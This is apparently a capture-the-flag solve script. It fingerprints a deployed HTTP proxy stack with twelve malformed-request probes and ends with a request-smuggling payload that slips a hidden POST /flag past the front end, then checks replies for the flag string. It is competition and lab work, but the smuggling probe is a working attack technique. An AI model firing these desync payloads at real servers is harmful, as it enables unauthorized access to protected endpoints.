#!/usr/bin/env python3
"""
Fingerprint the deployed mccrab3 stack and compare it with the local build.

Twelve connections, one request each except the last (which needs a follow-up so
proxoxy has a queued ResponseContext for a smuggled response). No scanning, no
brute force: every probe is a named discriminator derived from the grammar table
in NOTES.md.

    python3 solve/fingerprint.py 127.0.0.1 28888      # local baseline
    python3 solve/fingerprint.py <host> <port>        # deployed target
"""
import socket, sys, time, hashlib

SM = (b"POST /flag HTTP/1.1\r\nHost: h\r\nbrevski: george\r\n"
      b"Content-Length: 0\r\n\r\n")
FOLLOW = b"GET /health HTTP/1.1\r\nHost: h\r\n\r\n"

PROBES = [
    # (name, payload, follow-up or None)   what it discriminates
    ("baseline",        b"GET /health HTTP/1.1\r\nHost: h\r\n\r\n", None),
    ("404 page",        b"GET /nope HTTP/1.1\r\nHost: h\r\n\r\n", None),
    ("405 page",        b"POST /health HTTP/1.1\r\nHost: h\r\n\r\n", None),
    ("1.0 no Host",     b"GET /health HTTP/1.0\r\nX: 1\r\n\r\n", None),
    ("X_Foo underscore",b"GET /health HTTP/1.1\r\nHost: h\r\nX_Foo: 1\r\n\r\n", None),
    ("Transfer_Enc",    b"GET /health HTTP/1.1\r\nHost: h\r\nTransfer_Encoding: chunked\r\n\r\n", None),
    ("space before :",  b"GET /health HTTP/1.1\r\nHost: h\r\nFoo : bar\r\n\r\n", None),
    ("obs-fold",        b"GET /health HTTP/1.1\r\nHost: h\r\nFoo: bar\r\n baz\r\n\r\n", None),
    ("TE identity",     b"GET /health HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: identity\r\n\r\n", None),
    ("dup CL equal",    b"GET /health HTTP/1.1\r\nHost: h\r\nContent-Length: 0\r\nContent-Length: 0\r\n\r\n", None),
    ("CL 5,5",          b"GET /health HTTP/1.1\r\nHost: h\r\nContent-Length: 5,5\r\n\r\nAAAAA", None),
    ("smuggle CL0",     b"POST /health HTTP/1.1\r\nHost: h\r\nContent-Length: 0\r\n\r\n" + SM, FOLLOW),
]


def shoot(host, port, payload, follow, wait=0.7):
    out = b""
    try:
        s = socket.create_connection((host, int(port)), timeout=8)
    except Exception as e:
        return b"<CONNFAIL %s>" % str(e).encode()
    try:
        s.sendall(payload[:-1]); time.sleep(wait)
        s.settimeout(1.5)
        out += drain(s)
        s.sendall(payload[-1:]); time.sleep(wait)
        out += drain(s)
        if follow:
            s.sendall(follow); time.sleep(wait)
            out += drain(s)
    except Exception:
        pass
    finally:
        try: s.close()
        except Exception: pass
    return out


def drain(s):
    got = b""
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            got += d
    except socket.timeout:
        pass
    return got


def normalise(b):
    """Strip the volatile Date header so two runs are comparable."""
    return b"\r\n".join(l for l in b.split(b"\r\n")
                        if not l.lower().startswith(b"date:"))


def main():
    host, port = sys.argv[1], sys.argv[2]
    sig = []
    for name, payload, follow in PROBES:
        raw = shoot(host, port, payload, follow)
        n = normalise(raw)
        flag = b"TFCCTF" in raw or b"fake_flag" in raw
        line = raw.split(b"\r\n")[0][:48] if raw else b"(closed, zero bytes)"
        print("%-18s resp=%d bytes=%-6d %-10s %r%s"
              % (name, raw.count(b"HTTP/1."), len(raw),
                 hashlib.sha256(n).hexdigest()[:8], line,
                 "   *** FLAG ***" if flag else ""))
        sig.append(hashlib.sha256(n).hexdigest()[:8])
    print("SIGNATURE", "-".join(sig))


if __name__ == "__main__":
    main()
